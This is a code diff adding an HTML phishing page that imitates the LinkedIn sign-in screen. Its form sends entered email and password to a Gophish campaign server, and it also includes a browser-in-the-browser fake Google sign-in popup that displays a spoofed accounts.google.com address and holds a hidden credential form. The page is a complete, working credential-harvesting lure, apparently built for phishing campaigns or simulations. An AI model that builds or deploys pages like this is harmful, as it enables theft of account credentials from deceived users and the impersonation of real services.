@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LinkedIn - Sign in</title>
+    <link rel="stylesheet" href="../bitb/lib/bitb.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', 'Fira Sans', Ubuntu, Oxygen, sans-serif;
+            background-color: #f3f2ef;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .card {
+            background: #ffffff;
+            box-shadow: 0 0 0 1px rgba(0,0,0,0.1), 0 2px 3px rgba(0,0,0,0.2);
+            border-radius: 8px;
+            padding: 24px;
+        }
+
+        h1 {
+            font-size: 32px;
+            font-weight: 400;
+            color: rgba(0,0,0,0.9);
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: rgba(0,0,0,0.6);
+            margin-bottom: 24px;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: rgba(0,0,0,0.9);
+            margin-bottom: 4px;
+        }
+
+        input[type="email"],
+        input[type="password"],
+        input[type="text"] {
+            width: 100%;
+            padding: 10px 12px;
+            font-size: 16px;
+            border: 1px solid rgba(0,0,0,0.6);
+            border-radius: 4px;
+            background: #ffffff;
+            color: rgba(0,0,0,0.9);
+            transition: border-color 0.2s;
+        }
+
+        input:hover {
+            border-color: rgba(0,0,0,0.9);
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #0a66c2;
+            border-width: 2px;
+            padding: 9px 11px;
+        }
+
+        .forgot-link {
+            color: #0a66c2;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .button {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            background-color: #0a66c2;
+            color: #ffffff;
+            border: none;
+            border-radius: 24px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 24px;
+        }
+
+        .button:hover {
+            background-color: #004182;
+        }
+
+        .divider {
+            text-align: center;
+            margin: 24px 0;
+            position: relative;
+        }
+
+        .divider::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background-color: rgba(0,0,0,0.15);
+        }
+
+        .divider span {
+            background-color: #ffffff;
+            padding: 0 16px;
+            position: relative;
+            font-size: 14px;
+            color: rgba(0,0,0,0.6);
+        }
+
+        .google-button {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            background-color: #ffffff;
+            color: rgba(0,0,0,0.6);
+            border: 1px solid rgba(0,0,0,0.6);
+            border-radius: 24px;
+            cursor: pointer;
+            transition: background-color 0.2s, border-color 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .google-button:hover {
+            background-color: rgba(207,207,207,0.25);
+            border-color: rgba(0,0,0,0.9);
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 16px;
+            font-size: 14px;
+            color: rgba(0,0,0,0.9);
+        }
+
+        .footer a {
+            color: #0a66c2;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .error {
+            background-color: #fff4e5;
+            border: 1px solid #ffc107;
+            padding: 12px;
+            margin-bottom: 16px;
+            border-radius: 4px;
+            display: none;
+        }
+
+        .error-text {
+            color: #856404;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg width="102" height="28" viewBox="0 0 84 21" fill="none">
+                <path d="M14.09.75H.98v13.3h3.45V4.43h9.66V.75zm10.79 9.71c-.28-.01-.56.04-.82.15a1.84 1.84 0 0 0-.65.45 2.03 2.03 0 0 0-.43.7 2.4 2.4 0 0 0-.16.89v1.66h4.12v-1.66c0-.63-.2-1.14-.61-1.54-.4-.41-.93-.61-1.58-.65h.13zm4.57 3.55h-7.53v.77c0 .32.06.63.18.92.12.29.29.55.51.77.23.22.49.4.79.51.3.12.63.17.96.17.66 0 1.24-.18 1.74-.53.5-.35.86-.85 1.07-1.49h2.82c-.18.98-.62 1.82-1.3 2.51a5.14 5.14 0 0 1-2.22 1.42c-.84.30-1.74.45-2.68.45-1.02 0-1.96-.19-2.82-.56a6.1 6.1 0 0 1-2.17-1.54 6.91 6.91 0 0 1-1.4-2.33 8.22 8.22 0 0 1-.49-2.88c0-1 .16-1.94.49-2.82a6.99 6.99 0 0 1 1.4-2.33 6.59 6.59 0 0 1 2.17-1.58c.86-.39 1.8-.58 2.82-.58 1.01 0 1.94.18 2.8.55.85.37 1.58.88 2.20 1.54.61.66 1.09 1.44 1.43 2.34.34.9.51 1.89.51 2.96v.72h-.01zm8.14-6.28c.81 0 1.54.15 2.18.44.64.29 1.18.70 1.63 1.20.44.51.78 1.11 1.02 1.79.24.68.36 1.42.36 2.2 0 .79-.12 1.52-.36 2.21-.24.68-.58 1.28-1.02 1.79-.45.51-.99.91-1.63 1.20-.64.29-1.37.44-2.18.44s-1.54-.15-2.19-.44c-.65-.29-1.19-.69-1.64-1.20-.45-.51-.79-1.11-1.03-1.79-.24-.69-.36-1.42-.36-2.21 0-.78.12-1.52.36-2.20.24-.68.58-1.28 1.03-1.79.45-.5.99-.91 1.64-1.20.65-.29 1.38-.44 2.19-.44zm0 9.14c.40 0 .77-.09 1.10-.26.34-.17.62-.41.87-.71.25-.30.43-.66.57-1.07.14-.41.20-.86.20-1.34 0-.49-.07-.94-.20-1.35-.14-.41-.32-.76-.57-1.06-.24-.30-.53-.54-.87-.71a2.4 2.4 0 0 0-1.10-.26c-.40 0-.77.09-1.11.26-.34.17-.63.41-.87.71-.25.30-.44.65-.57 1.06-.14.41-.21.86-.21 1.35 0 .48.07.93.21 1.34.13.41.32.77.57 1.07.24.30.53.54.87.71.34.17.71.26 1.11.26zm8.35-12.83h3.13v3.7h-3.13v-3.70zm0 4.81h3.13v8.73h-3.13V9.35zm6.5 0h3.03v1.21h.04c.21-.41.47-.77.81-1.08.34-.31.72-.56 1.16-.75.44-.19.90-.28 1.41-.28.76 0 1.41.14 1.95.41.54.27.98.64 1.34 1.11.35.47.61 1.01.78 1.64.17.62.25 1.29.25 2v5.47h-3.13v-5.02c0-.85-.18-1.48-.54-1.90-.36-.42-.87-.63-1.52-.63-.39 0-.73.07-1.03.22-.30.15-.55.36-.76.63-.21.27-.37.60-.47.97-.11.38-.16.79-.16 1.24v4.49h-3.13V9.35h-.03z" fill="#0A66C2"/>
+            </svg>
+        </div>
+
+        <div class="card">
+            <div id="errorDiv" class="error">
+                <p class="error-text">That's not the right password. Try again or reset it.</p>
+            </div>
+
+            <h1>Sign in</h1>
+            <p class="subtitle">Stay updated on your professional world</p>
+
+            <form id="loginForm" method="POST">
+                <div class="form-group">
+                    <label for="email">Email or Phone</label>
+                    <input type="text" id="email" name="email" required autofocus>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+
+                <div class="form-group">
+                    <a href="#" class="forgot-link">Forgot password?</a>
+                </div>
+
+                <button type="submit" class="button">Sign in</button>
+            </form>
+
+            <div class="divider">
+                <span>or</span>
+            </div>
+
+            <button class="google-button"
+                data-bitb-trigger
+                data-bitb-title="Sign in - Google Accounts"
+                data-bitb-url="https://accounts.google.com/signin/oauth"
+                data-bitb-width="500"
+                data-bitb-height="600"
+                data-bitb-browser="chrome"
+                data-bitb-content="google-oauth-content">
+                <svg width="18" height="18" viewBox="0 0 18 18">
+                    <path fill="#4285F4" d="M17.6 9.2c0-.6-.1-1.2-.2-1.8H9v3.4h4.8c-.2 1.1-.8 2-1.7 2.6v2.2h2.8c1.6-1.5 2.5-3.7 2.5-6.3z"/>
+                    <path fill="#34A853" d="M9 18c2.4 0 4.5-.8 6-2.2l-2.8-2.2c-.8.5-1.8.8-3.2.8-2.4 0-4.5-1.6-5.2-3.9H1v2.3C2.4 15.8 5.5 18 9 18z"/>
+                    <path fill="#FBBC04" d="M3.8 10.5c-.2-.5-.3-1.1-.3-1.7s.1-1.2.3-1.7V4.8H1C.4 6 0 7.4 0 9s.4 3 1 4.2l2.8-2.7z"/>
+                    <path fill="#EA4335" d="M9 3.6c1.4 0 2.6.5 3.6 1.4l2.6-2.6C13.5.9 11.4 0 9 0 5.5 0 2.4 2.2 1 5.2l2.8 2.3c.7-2.3 2.8-3.9 5.2-3.9z"/>
+                </svg>
+                Continue with Google
+            </button>
+        </div>
+
+        <div class="footer">
+            New to LinkedIn? <a href="#">Join now</a>
+        </div>
+    </div>
+
+    <!-- Hidden BitB OAuth Content -->
+    <div id="google-oauth-content" style="display: none;">
+        <div style="background: white; padding: 44px; text-align: center;">
+            <svg width="75" height="24" viewBox="0 0 75 24" style="margin-bottom: 16px;">
+                <path fill="#4285F4" d="M23.7 12.3c0-.8-.1-1.5-.3-2.2H12v4.1h6.5c-.3 1.5-1.2 2.8-2.5 3.6v3h4c2.4-2.2 3.7-5.4 3.7-8.5z"/>
+                <path fill="#34A853" d="M12 24c3.2 0 6-1.1 8-2.9l-4-3c-1.1.7-2.5 1.2-4 1.2-3.1 0-5.7-2.1-6.7-4.9H1v3.1C3.1 21.2 7.2 24 12 24z"/>
+                <path fill="#FBBC04" d="M5.3 14.3c-.2-.7-.3-1.5-.3-2.3s.1-1.6.3-2.3V6.6H1C.4 7.9 0 9.4 0 11s.4 3.1 1 4.4l4.3-3.1z"/>
+                <path fill="#EA4335" d="M12 4.8c1.7 0 3.3.6 4.5 1.7l3.4-3.4C17.9 1.2 15.2 0 12 0 7.2 0 3.1 2.8 1 6.6l4.3 3.1C6.3 6.9 8.9 4.8 12 4.8z"/>
+            </svg>
+            <h2 style="color: #202124; font-size: 24px; margin-bottom: 8px;">Sign in</h2>
+            <p style="color: #5f6368; font-size: 14px; margin-bottom: 24px;">Use your Google Account</p>
+            <form method="POST" action="" style="text-align: left;">
+                <div style="margin-bottom: 16px;">
+                    <input type="email" name="email" placeholder="Email or phone" required
+                        style="width: 100%; padding: 12px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px;">
+                </div>
+                <div style="margin-bottom: 16px;">
+                    <input type="password" name="password" placeholder="Enter your password" required
+                        style="width: 100%; padding: 12px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px;">
+                </div>
+                <button type="submit" style="background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; width: 100%;">
+                    Sign in
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            // Let form submit naturally to Gophish
+        });
+    </script>
+    <script src="../bitb/lib/bitb.js"></script>
+</body>
+</html>
